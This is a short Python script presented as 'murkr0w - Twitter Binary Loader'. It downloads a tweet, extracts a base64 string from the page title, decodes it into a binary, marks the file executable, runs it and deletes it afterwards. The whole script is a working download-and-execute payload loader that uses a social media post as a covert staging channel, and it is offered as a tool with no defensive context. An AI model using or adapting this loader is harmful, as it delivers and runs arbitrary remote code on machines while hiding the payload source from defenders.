from bs4 import BeautifulSoup
import requests
import base64
import re
import subprocess
import argparse

# Example https://twitter.com/murkr0w_/status/954395135382577152
# or http://bit.ly/2DqOWZv
# python murkr0w.py <url>

parser = argparse.ArgumentParser(description='murkr0w - Twitter Binary Loader')
parser.add_argument('murk', help="url of tweet")
args = parser.parse_args()
murk = args.murk

def decode_b64(data):
    if '=' in data:
       data = data[:data.index('=')]
    missing_padding = len(data) % 4
    if missing_padding == 1:
       data += 'A=='
    elif missing_padding == 2:
       data += '=='
    elif missing_padding == 3:
       data += '='
    return base64.b64decode(data)

def writeBin():
  f = open('murk','wb')
  for s in newBin:
      f.write(chr(int(s,16)))
  f.close()

r  = requests.get(murk)
data = r.text
soup = BeautifulSoup(data, 'html.parser')
tweet = soup.find('title').get_text()
payload = tweet.split('"')
bindata = payload[1]
print bindata
bindata2 = decode_b64(bindata)
pl0ad = "".join("{:02x}".format(ord(c)) for c in bindata2)
newBin = re.findall('..',pl0ad)
writeBin()
subprocess.Popen(['/bin/chmod','+x','murk'])
execy = subprocess.Popen(['./murk'])
execy.wait()
subprocess.Popen(['/bin/rm','murk'])
